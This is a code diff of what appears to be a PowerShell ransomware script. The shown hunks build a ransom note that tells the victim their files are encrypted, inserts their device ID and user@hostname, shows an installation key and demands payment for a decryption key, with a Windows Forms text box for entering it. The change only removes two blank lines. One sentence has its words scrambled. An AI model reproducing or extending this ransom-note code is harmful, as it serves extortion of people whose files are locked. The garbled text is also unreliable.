@@ -26,7 +26,6 @@ $hostname = $env:COMPUTERNAME
 $instructions = "Ooops, your important files are encrypted.`r`n`r`n" +
 "▮▮▮▮▮▮▮▮▮▮▮▮▮▮▮▮▮▮▮▮▮▮▮▮▮▮▮▮▮▮▮▮▮▮▮▮`r`n`r`n" +
 "If you see this text, then your files are no longer accessible, because they have been encrypted. Perhaps you are busy looking for a way to recover your files, but don't waste your timе. Nobody can recover your files without our decryption service.`r`n`r`n" +
-"`r`n" +
 "Device ID: $deviceID`r`n" +
 "User: $username@$hostname`r`n`r`n" +
 "We guarantee that you can recover all your files safely and easily. need to do is submit the payment and purchase the decryption key. All you`r`n`r`n" +
@@ -40,7 +39,6 @@ $instructions = "Ooops, your important files are encrypted.`r`n`r`n" +
 "Installation Key:`r`n" +
 "zRNaqE-CDBMFC-pD5iA4-vFdSd2-14hMs5-d7UCzb-RYj3fE-ANg8rk-49XFX2-Ed2R5A`r`n`r`n" +
 "After payment, you will receive your decryption key.`r`n`r`n" +
-"`r`n" +
 "If you already have the key, enter it below:"
 
 $body = New-Object Windows.Forms.TextBox
